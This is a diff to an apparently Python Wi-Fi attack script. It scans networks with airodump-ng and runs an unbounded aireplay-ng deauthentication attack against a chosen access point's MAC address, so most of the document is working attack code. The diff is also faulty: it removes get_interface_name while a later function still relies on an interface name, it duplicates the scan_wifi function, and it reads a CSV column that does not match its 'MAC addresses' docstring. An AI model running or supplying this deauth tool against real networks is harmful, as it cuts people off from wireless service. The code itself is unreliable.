@@ -17,17 +17,23 @@ def stop_airmon() -> None:
     except subprocess.CalledProcessError as e:
         print(f"Error stopping airmon-ng: {e}")
 
-def get_interface_name() -> str:
-    """Get the interface name (e.g. wlan0mon)"""
+def scan_wifi(interface_name: str) -> List[str]:
+    """Scan for wireless networks and return a list of MAC addresses"""
     try:
-        output = subprocess.check_output(["airmon-ng"])
-        for line in output.decode("utf-8").split("\n"):
-            if "wlan0" in line:
-                return line.split()[1]
-        return ""
+        subprocess.run(["airodump-ng", "-w", "scan", "--output-format", "csv", interface_name], timeout=None, check=True)
+        with open("scan-01.csv", "r") as f:
+            reader = csv.reader(f)
+            wifi_list = [row[13].strip() for row in reader][1:]  # Skip the header
+        return wifi_list
     except subprocess.CalledProcessError as e:
-        print(f"Error getting interface name: {e}")
-        return ""
+        print(f"Error scanning for WiFi: {e}")
+        return []
+    except FileNotFoundError:
+        print("Error: scan-01.csv file not found")
+        return []
+    except KeyboardInterrupt:
+        print("\nScan cancelled. Returning to menu...")
+        return []
 
 def scan_wifi(interface_name: str) -> List[str]:
     """Scan for wireless networks and return a list of MAC addresses"""
@@ -63,7 +69,12 @@ def deauth_attack(mac_address):
         print("Failed to get interface name")
         return
     # Perform deauth attack
-    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
+    try:
+        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
+    except subprocess.CalledProcessError as e:
+        print(f"Error deauthenticating device: {e}")
+    except KeyboardInterrupt:
+        print("\nDeauth attack cancelled. Returning to menu...")
 
 
 def get_connected_devices(interface_name: str) -> List[str]:
